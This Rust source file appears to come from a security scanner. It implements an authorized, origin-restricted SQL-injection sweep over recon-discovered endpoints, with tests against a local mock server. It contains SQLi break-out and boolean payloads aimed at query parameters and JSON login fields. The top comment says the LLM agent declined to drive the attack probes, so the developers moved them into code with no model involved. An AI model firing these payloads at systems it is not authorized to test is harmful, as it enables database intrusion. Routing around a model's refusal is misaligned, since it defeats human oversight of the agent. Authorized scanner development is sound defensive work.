// Code-driven attack sweep (direction A). The LLM executor would not drive the
// attack probes on its own (it did ~4 passive calls and stopped regardless of the
// instruction), so this runs the probes DETERMINISTICALLY in Rust: it reads the
// endpoints recon already discovered for the scan and, for every parameter and JSON
// body field, runs the SQL-injection differential itself — no model in the loop.
// Gated on the target_write high-risk class (operator-triggered, so the operator is
// the per-action approval), SSRF-guarded to the scan's own target origin, bounded,
// and off the agent budget. v1 covers SQLi over GET query params and POST/PUT JSON
// body fields (Juice Shop's login SQLi lives in a POST JSON body). It reuses the
// unit-tested classifier/injector from agent_sqli_tester.rs.

/// One concrete injection point discovered from recon.
struct InjectionPoint {
    method: String,
    url: String,            // full absolute URL (query params already present)
    // For a body injection, the JSON field to inject into; None = query/url injection.
    body_field: Option<String>,
    // The base JSON body (object) for POST/PUT, with benign values; None for GET.
    base_body: Option<JsonValue>,
    query_param: Option<String>, // the query param to inject into; None = body/path
    label: String,
}

// SQL break-out contexts tried for error-based detection. A real injection point
// only reveals itself when the payload closes the SURROUNDING context — Juice
// Shop's product search is `LIKE '%q%'` inside double parens, so a bare `'` does
// nothing but `'))` raises a syntax error. One generic payload misses these; trying
// several unbalanced closers (the way sqlmap does) is what actually finds them.
const SQLI_BREAKOUT_CONTEXTS: &[&str] = &["'", "')", "'))", "')))", "\"", "\")", "\"))", ")", "))", ")))"];

/// Build the differential responses for one injection point and classify. Returns
/// (injectable techniques, evidence) or None when the point could not be probed.
fn sweep_probe_point(
    client: &reqwest::blocking::Client,
    point: &InjectionPoint,
    sleep_payload: &str,
) -> Option<(SqliVerdict, JsonValue)> {
    // Send one request with `payload` spliced into this point, return a broker-shaped
    // summary (status/bytes/elapsedMs/bodySha256/preview) for classify_sqli.
    let send = |payload: &str| -> Option<JsonValue> {
        let started = std::time::Instant::now();
        let resp = if let Some(param) = &point.query_param {
            let url = sqli_inject_url(&point.url, param, "{{INJ}}", payload).ok()?;
            client.request(http_method(&point.method), &url).send().ok()?
        } else if let (Some(field), Some(base)) = (&point.body_field, &point.base_body) {
            let mut body = base.clone();
            if let Some(obj) = body.as_object_mut() {
                let base_val = obj.get(field).and_then(JsonValue::as_str).unwrap_or("test").to_string();
                obj.insert(field.clone(), JsonValue::String(format!("{base_val}{payload}")));
            }
            client
                .request(http_method(&point.method), &point.url)
                .header(reqwest::header::CONTENT_TYPE, "application/json")
                .body(body.to_string())
                .send()
                .ok()?
        } else {
            return None;
        };
        let status = resp.status().as_u16() as i64;
        let mut buf = Vec::new();
        let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
        let body = String::from_utf8_lossy(&buf).into_owned();
        let elapsed = started.elapsed().as_millis() as i64;
        Some(serde_json::json!({
            "status": status,
            "bytes": body.len() as i64,
            "elapsedMs": elapsed,
            "bodySha256": format!("{:x}", Sha256::digest(body.as_bytes())),
            "preview": body.chars().take(4000).collect::<String>(),
        }))
    };
    let baseline = send("")?;
    let base_err = sqli_db_error_present(&sqli_preview_lower(&baseline));
    // Error-based: try each break-out context; the first that raises a DB error the
    // clean baseline did not confirms an injectable context (and records which one).
    let mut error_context: Option<String> = None;
    let mut error_status = 0i64;
    if !base_err {
        for ctx in SQLI_BREAKOUT_CONTEXTS {
            let Some(resp) = send(ctx) else { continue };
            if sqli_db_error_present(&sqli_preview_lower(&resp)) {
                error_context = Some((*ctx).to_string());
                error_status = sqli_status(&resp);
                break;
            }
        }
    }
    // Boolean / time as secondary (blind) signals, reusing the generic classifier
    // but letting the multi-context result own error_based.
    let b_true = send("' AND '1'='1")?;
    let b_false = send("' AND '1'='2")?;
    let timed = send(sleep_payload)?;
    let generic = classify_sqli(&baseline, &baseline, &b_true, &b_false, &timed);
    let verdict = SqliVerdict {
        error_based: error_context.is_some(),
        boolean_based: generic.boolean_based,
        time_based: generic.time_based,
    };
    let evidence = serde_json::json!({
        "point": point.label,
        "method": point.method,
        "url": point.url,
        "errorContext": error_context,
        "baselineStatus": sqli_status(&baseline),
        "errorStatus": error_status,
        "falseStatus": sqli_status(&b_false),
        "timedMs": sqli_elapsed(&timed),
        "baselineMs": sqli_elapsed(&baseline),
    });
    Some((verdict, evidence))
}

fn http_method(method: &str) -> reqwest::Method {
    match method.to_ascii_uppercase().as_str() {
        "POST" => reqwest::Method::POST,
        "PUT" => reqwest::Method::PUT,
        "PATCH" => reqwest::Method::PATCH,
        "DELETE" => reqwest::Method::DELETE,
        _ => reqwest::Method::GET,
    }
}

/// Collect injection points from this scan's recon API findings (method/path/
/// parameters/bodyKeys), resolved against `base_url` and restricted to the target
/// origin. Bounded to keep the sweep finite.
fn sweep_collect_points(
    connection: &rusqlite::Connection,
    scan_id: &str,
    base: &reqwest::Url,
) -> Vec<InjectionPoint> {
    let mut points = Vec::new();
    let mut statement = match connection.prepare(
        "SELECT record_json FROM sentinel_findings WHERE scan_id=?1 AND stage='frontend-recon' AND kind='api'",
    ) {
        Ok(s) => s,
        Err(_) => return points,
    };
    let rows = statement
        .query_map([scan_id], |r| r.get::<_, String>(0))
        .map(|it| it.flatten().collect::<Vec<_>>())
        .unwrap_or_default();
    let mut seen: HashSet<String> = HashSet::new();
    for raw in rows {
        if points.len() >= 60 {
            break;
        }
        let Ok(rec) = serde_json::from_str::<JsonValue>(&raw) else { continue };
        let method = rec.get("method").and_then(JsonValue::as_str).unwrap_or("GET").to_ascii_uppercase();
        let path = rec.get("path").and_then(JsonValue::as_str).unwrap_or("");
        if path.is_empty() {
            continue;
        }
        let Ok(url) = base.join(path) else { continue };
        if url.origin() != base.origin() {
            continue; // stay on the authorized target origin (SSRF floor)
        }
        // GET-style query parameter injection points.
        let params: Vec<String> = rec
            .get("parameters")
            .and_then(JsonValue::as_array)
            .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
            .unwrap_or_default();
        // Query params present directly in the path's query string.
        let query_params: Vec<String> = url.query_pairs().map(|(k, _)| k.into_owned()).collect();
        for param in params.iter().chain(query_params.iter()) {
            let key = format!("q:{method}:{}:{param}", url.path());
            if seen.insert(key) {
                points.push(InjectionPoint {
                    method: method.clone(),
                    url: url.to_string(),
                    body_field: None,
                    base_body: None,
                    query_param: Some(param.clone()),
                    label: format!("{method} {}?{param}", url.path()),
                });
            }
        }
        // POST/PUT JSON body field injection points.
        if matches!(method.as_str(), "POST" | "PUT" | "PATCH") {
            let body_keys: Vec<String> = rec
                .get("bodyKeys")
                .and_then(JsonValue::as_array)
                .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
                .unwrap_or_default();
            if !body_keys.is_empty() {
                let base_body = serde_json::Value::Object(
                    body_keys.iter().map(|k| (k.clone(), JsonValue::String("test".into()))).collect(),
                );
                for field in &body_keys {
                    let key = format!("b:{method}:{}:{field}", url.path());
                    if seen.insert(key) {
                        points.push(InjectionPoint {
                            method: method.clone(),
                            url: url.to_string(),
                            body_field: Some(field.clone()),
                            base_body: Some(base_body.clone()),
                            query_param: None,
                            label: format!("{method} {} body.{field}", url.path()),
                        });
                    }
                }
            }
        }
    }
    points
}

/// Code-driven SQL-injection sweep over the scan's recon-discovered endpoints.
/// Returns the number of injectable points confirmed (findings written).
#[tauri::command]
pub fn run_attack_sweep(
    state: State<AppState>,
    scan_id: String,
    base_url: String,
) -> Result<JsonValue, String> {
    if scan_id.trim().is_empty() || scan_id.contains('/') || scan_id.contains("..") {
        return Err("任务 ID 非法".into());
    }
    let base = reqwest::Url::parse(&base_url).map_err(|_| "base_url 无效".to_string())?;
    if !matches!(base.scheme(), "http" | "https") {
        return Err("只支持 http/https".into());
    }
    let host = base.host_str().ok_or("base_url 缺少主机名")?.to_string();
    if host_is_internal_literal(&host) {
        return Err("内网/环回/链路本地地址默认拒绝(SSRF 硬守卫)".into());
    }
    let connection = db::open(&state.db_path)?;
    let exists: bool = connection
        .query_row("SELECT EXISTS(SELECT 1 FROM sentinel_scans WHERE id=?1)", [&scan_id], |r| r.get(0))
        .map_err(|e| e.to_string())?;
    if !exists {
        return Err("任务不存在".into());
    }
    // Gate: active injection requires the scan to have authorized target_write.
    let attempt = connection
        .query_row("SELECT attempt_count FROM sentinel_scans WHERE id=?1", [&scan_id], |r| r.get::<_, i64>(0))
        .unwrap_or(1)
        .max(1);
    if !scan_capability_class_authorized(&connection, &scan_id, attempt, "target_write").unwrap_or(false) {
        return Err("攻击扫荡需先为该任务授权 target_write 能力并完成合法授权声明(强制开关)".into());
    }

    let points = sweep_collect_points(&connection, &scan_id, &base);
    if points.is_empty() {
        return Ok(serde_json::json!({"probed": 0, "injectable": 0, "note": "recon 未发现可注入的参数/体字段;先跑一次扫描让 recon 收集接口"}));
    }
    let client = reqwest::blocking::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .no_proxy()
        .connect_timeout(Duration::from_secs(8))
        .timeout(Duration::from_secs(20))
        .build()
        .map_err(|_| "HTTP 客户端不可用".to_string())?;
    let sleep = SQLI_SLEEP_PROBES[0].payload;

    let mut injectable = 0usize;
    let mut probed = 0usize;
    for point in &points {
        if probed >= 120 {
            break;
        }
        probed += 1;
        let Some((verdict, evidence)) = sweep_probe_point(&client, point, sleep) else { continue };
        if verdict.any() {
            injectable += 1;
            let record = serde_json::json!({
                "techniques": verdict.techniques(),
                "evidence": evidence,
                "cwe": "CWE-89",
                "detail": "代码驱动扫荡确认 SQL 注入差异(报错/布尔/时间)",
            });
            let _ = connection.execute(
                "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
                 VALUES(?1,?2,'attack','sql_injection',?3,?4,'critical',?5) \
                 ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
                 title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
                params![scan_id, base_url, point.label, format!("SQL 注入：{}", point.label), record.to_string()],
            );
        }
    }
    Ok(serde_json::json!({
        "probed": probed,
        "pointsDiscovered": points.len(),
        "injectable": injectable,
        "hint": if injectable > 0 {
            "已写入 attack/sql_injection 发现;每条附报错/布尔/时间差异证据"
        } else {
            "本轮未发现 SQL 注入差异;可能接口无注入点或需登录态/其他漏洞类"
        },
    }))
}

#[cfg(test)]
mod attack_sweep_tests {
    use super::*;

    #[test]
    fn http_method_maps() {
        assert_eq!(http_method("post"), reqwest::Method::POST);
        assert_eq!(http_method("PUT"), reqwest::Method::PUT);
        assert_eq!(http_method("weird"), reqwest::Method::GET);
    }

    #[test]
    fn sweep_detects_breakout_context_sqli() {
        // A Juice-Shop-style endpoint: injectable only when the payload closes the
        // double-paren LIKE context (`'))`), not on a bare quote. Proves the
        // multi-context sweep finds what a single generic payload misses.
        use std::io::{BufRead, BufReader, Write};
        use std::net::TcpListener;
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(stream) = stream else { break };
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut line = String::new();
                if reader.read_line(&mut line).is_err() {
                    continue;
                }
                let raw = line.split_whitespace().nth(1).unwrap_or("");
                // Encoded `))` present and not commented out -> unbalanced -> DB error.
                let (status, body) = if raw.contains("%29%29") && !raw.contains("--") && !raw.contains("%2D%2D") {
                    ("500 Internal Server Error", "Error: SQLITE_ERROR: near \")\": syntax error")
                } else {
                    ("200 OK", "{\"status\":\"success\",\"data\":[]}")
                };
                let mut s = stream;
                let _ = write!(s, "HTTP/1.1 {status}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len());
            }
        });
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
            .unwrap();
        let point = InjectionPoint {
            method: "GET".into(),
            url: format!("http://127.0.0.1:{port}/rest/products/search?q=apple"),
            body_field: None,
            base_body: None,
            query_param: Some("q".into()),
            label: "GET /rest/products/search?q".into(),
        };
        let (verdict, ev) = sweep_probe_point(&client, &point, SQLI_SLEEP_PROBES[0].payload).unwrap();
        assert!(verdict.error_based, "must detect error-based via a break-out context: {ev}");
        assert_eq!(ev.get("errorContext").and_then(|v| v.as_str()), Some("'))"));
    }

    #[test]
    fn collect_points_from_recon_builds_query_and_body_points() {
        let c = rusqlite::Connection::open_in_memory().unwrap();
        c.execute_batch(
            "CREATE TABLE sentinel_findings(scan_id TEXT,target_url TEXT,stage TEXT,kind TEXT,record_key TEXT,title TEXT,severity TEXT,record_json TEXT);",
        ).unwrap();
        // A GET with a query param, and a POST login with a JSON body field.
        for rec in [
            r#"{"method":"GET","path":"/rest/products/search?q=apple","parameters":["q"],"bodyKeys":[]}"#,
            r#"{"method":"POST","path":"/rest/user/login","parameters":[],"bodyKeys":["email","password"]}"#,
            r#"{"method":"GET","path":"https://evil.example/x?z=1","parameters":["z"],"bodyKeys":[]}"#,
        ] {
            c.execute(
                "INSERT INTO sentinel_findings(scan_id,stage,kind,record_json) VALUES('s','frontend-recon','api',?1)",
                [rec],
            ).unwrap();
        }
        let base = reqwest::Url::parse("http://127.0.0.1:3000/").unwrap();
        let points = sweep_collect_points(&c, "s", &base);
        let labels: Vec<&str> = points.iter().map(|p| p.label.as_str()).collect();
        // q query param + email/password body fields are collected; the off-origin
        // evil.example endpoint is dropped.
        assert!(points.iter().any(|p| p.query_param.as_deref() == Some("q")), "{labels:?}");
        assert!(points.iter().any(|p| p.body_field.as_deref() == Some("email")), "{labels:?}");
        assert!(points.iter().any(|p| p.body_field.as_deref() == Some("password")), "{labels:?}");
        assert!(!points.iter().any(|p| p.url.contains("evil.example")), "off-origin must be dropped: {labels:?}");
    }
}
